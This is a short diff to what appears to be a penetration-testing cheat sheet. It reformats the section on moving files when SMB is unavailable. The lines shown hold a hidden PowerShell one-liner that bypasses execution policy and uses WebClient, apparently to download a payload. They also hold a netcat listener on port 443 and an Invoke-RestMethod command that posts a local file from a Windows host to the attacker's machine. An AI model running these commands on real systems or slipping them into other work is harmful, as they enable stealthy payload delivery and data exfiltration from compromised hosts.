@@ -30,9 +30,11 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClien
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------
 # If you can't copy over SMB
-## On Local Box
+### On Local Box
+```sh
 nc -lnvp 443 > Out.File
-## On Windows Box
+```
+### On Windows Box
 ```ps
 Invoke-RestMethod -Uri http://<LocalIPAddress>:<PORT>/<FILE> -Method Post -InFile <LocalFile>
 ```
